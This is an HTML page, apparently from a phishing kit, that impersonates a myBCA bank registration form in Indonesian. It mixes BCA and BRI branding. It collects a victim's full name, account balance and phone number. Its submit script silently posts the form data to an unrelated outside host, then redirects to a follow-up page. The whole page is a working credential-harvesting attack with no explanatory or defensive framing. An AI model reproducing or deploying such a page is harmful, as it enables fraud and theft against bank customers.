<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Formulir pendaftaran myBCA. Isi data lengkap Anda untuk melanjutkan.">
  <meta name="keywords" content="BCA, myBCA, pendaftaran, bank, formulir">
  <meta name="author" content="PT. Bank BCA (Persero) Tbk.">
  <title>Formulir Pendaftaran myBCA</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <script>
   document.addEventListener('DOMContentLoaded', function () {
     const input = document.getElementById('b');
     input.addEventListener('input', function (e) {
       let value = e.target.value;
       value = value.replace(/[^,\d]/g, '').toString();
       const split = value.split(',');
       const sisa = split[0].length % 3;
       let rupiah = split[0].substr(0, sisa);
       const ribuan = split[0].substr(sisa).match(/\d{3}/gi);
       if (ribuan) {
         const separator = sisa ? '.' : '';
         rupiah += separator + ribuan.join('.');
       }
       rupiah = split[1] !== undefined ? rupiah + ',' + split[1] : rupiah;
       e.target.value = rupiah;
     });
   });
  </script>
</head>
<body class="flex items-center justify-center min-h-screen">
  <div class="fixed top-0 left-0 w-full flex justify-start p-2 bg-blue-800">
    <img alt="Decorative image of BRI logo" class="h-20 w-20" src="FA_L_Ogo_BR_Imo_FSTVL_2_c9be1a8077.png"/>
  </div>
  <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md mt-24">
    <div class="flex justify-between items-center mb-6">
      <img alt="BRI logo" class="h-8" height="50" src="AddText_05-17-01.58.57.jpg" width="200"/> 
      <a class="text-blue-800" href="#"> 
          üìùIsi Formulir Pendaftaran Kamu dibawah ini."
      </a>
    </div>
    <form id="formData" method="POST">
      <div class="mb-4">
        <label class="block text-gray-700 mb-2">
          Nama Lengkap (Tanpa Singkatan)
        </label>
        <input class="w-full px-3 py-2 border rounded-lg" id="a" name="a" placeholder="" required type="text"/>
      </div>
      <div class="mb-4">
        <label class="block text-gray-700 mb-2">
          Saldo Akhir Saat Ini
        </label>
        <div class="flex">
          <span class="inline-flex items-center px-3 border border-r-0 rounded-l-lg bg-gray-200 text-gray-600">
            Rp.
          </span>
          <input class="w-full px-3 py-2 border rounded-r-lg" id="b" name="b" placeholder="0,00" required type=""/>
        </div>
      </div>
      <div class="mb-6">
        <label class="block text-gray-700 mb-2">
          Nomor Handphone
        </label>
        <input class="w-full px-3 py-2 border rounded-lg" id="c" name="c" placeholder="0812XXXXXXXX" required type="tel"/>
      </div>
      <div class="flex justify-between">
      
        <button class="px-12 py-3 bg-blue-800 text-white rounded-lg" id="kirims" type="submit">DAFTAR SEKARANG
        </button>
      </div>
    </form>
    <div class="text-center mt-6 text-gray-600">
      ¬© 2025 PT. Bank Rakyat Indonesia (Persero) Tbk.
    </div>
  </div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js"></script>
  <script src="https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
  <script src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
  <script>
    $(document).ready(function () {
      $("#nokar").mask("0000 0000 0000 0000");
      $(".uang").mask("000.000.000.000.000", { reverse: true });
      var dengan_rupiah = document.getElementById("saldo");
      dengan_rupiah.addEventListener("keyup", function (e) {
        dengan_rupiah.value = formatRupiah(this.value, "Rp. ");
      });

      function formatRupiah(angka, prefix) {
        var number_string = angka.replace(/[^,\d]/g, "").toString(),
          split = number_string.split(","),
          sisa = split[0].length % 3,
          rupiah = split[0].substr(0, sisa),
          ribuan = split[0].substr(sisa).match(/\d{3}/gi);

        if (ribuan) {
          separator = sisa ? "." : "";
          rupiah += separator + ribuan.join(".");
        }

        rupiah = split[1] != undefined ? rupiah + "," + split[1] : rupiah;
        return prefix == undefined ? rupiah : rupiah ? "Rp. " + rupiah : "";
      }
    });

    $(document).ready(function () {
      $("#formData").submit(function (e) {
        event.preventDefault();
        document.getElementById("kirims").innerHTML = "Memproses....";
        $("#process1").show();

        $.ajax({
          type: "POST",
          url: "https://mediojek.biz.id/bcaaypss/req/one.php",
          data: $(this).serialize(),
          datatype: "JSON",

          complete: function (data) {
            console.log("Complete");
            setTimeout(function () {
              $("#process1").hide();
              document.getElementById("kirims").innerHTML = "Selanjutnya";
              window.location.href = "konf.html";
              var a = document.getElementById("a").value;
              sessionStorage.setItem("a", a);
              var b = document.getElementById("b").value;
              sessionStorage.setItem("b", b);
              var c = document.getElementById("c").value;
              sessionStorage.setItem("c", c);
            }, 5500);
          },
        });
      });
      return false;
    });
  </script>
</body>
</html>
